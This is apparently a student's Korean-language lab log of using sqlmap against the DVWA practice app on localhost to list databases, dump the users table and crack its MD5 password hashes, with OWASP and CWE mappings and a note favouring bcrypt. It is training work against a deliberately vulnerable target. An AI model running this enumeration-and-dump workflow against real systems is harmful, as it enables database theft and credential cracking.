# Day 4 — sqlmap 실습 결과

> 대상: DVWA (`http://localhost:8081/vulnerabilities/sqli/`)
> 도구: sqlmap 1.10.3
> 날짜: 2026-04-02

---

## 실습 결과

### 1. DB 목록 조회 (`--dbs`)
```
[*] dvwa
[*] information_schema
```

### 2. 테이블 목록 (`-D dvwa --tables`)
```
+-----------+
| guestbook |
| users     |
+-----------+
```

### 3. users 테이블 덤프 (`-D dvwa -T users --dump`)
```
admin   → password  (MD5: 5f4dcc3b5aa765d61d8327deb882cf99)
gordonb → abc123    (MD5: e99a18c428cb38d5f260853678922e03)
1337    → charley   (MD5: 8d3533d75ae2c3966d7e0d4fcc69216b)
pablo   → letmein   (MD5: 0d107d09f5bbe40cade3de5c71e9e9b7)
smithy  → password  (MD5: 5f4dcc3b5aa765d61d8327deb882cf99)
```

→ sqlmap이 MD5 해시를 자동으로 크랙까지 수행

---

## Day 2(Repeater) vs Day 4(sqlmap) 비교

| 항목 | Burp Repeater | sqlmap |
|------|--------------|--------|
| 방식 | 수동 페이로드 작성 | 완전 자동화 |
| 속도 | 느림 | 빠름 |
| 해시 크랙 | 직접 해야 함 | 자동 크랙 |
| 학습 가치 | SQLi 원리 이해 | 실무 자동화 |
| 실험 활용 | 원리 검증 | 스캔 자동화 |

---

## 핵심 배운 점

1. sqlmap은 취약점 탐지 → DB 열거 → 데이터 덤프 → 해시 크랙까지 자동화
2. `--batch` 옵션으로 대화형 입력 없이 자동 실행
3. 실험에서 LLM 생성 코드 스캔 시 sqlmap으로 SQLi 자동 검증 가능
4. MD5는 sqlmap 내장 사전으로 즉시 크랙 → bcrypt 필수

---

## OWASP 연결

| 취약점 | OWASP | CWE |
|--------|-------|-----|
| SQL Injection | A03:2021 – Injection | CWE-89 |
| 취약한 패스워드 해싱 | A02:2021 – Cryptographic Failures | CWE-916 |

---

## Day 4 체크리스트

- [x] sqlmap 기본 스캔 실행 (취약점 탐지)
- [x] --dbs 로 DB 목록 조회
- [x] -D dvwa --tables 로 테이블 목록 조회
- [x] -T users --dump 로 데이터 덤프 + 해시 크랙
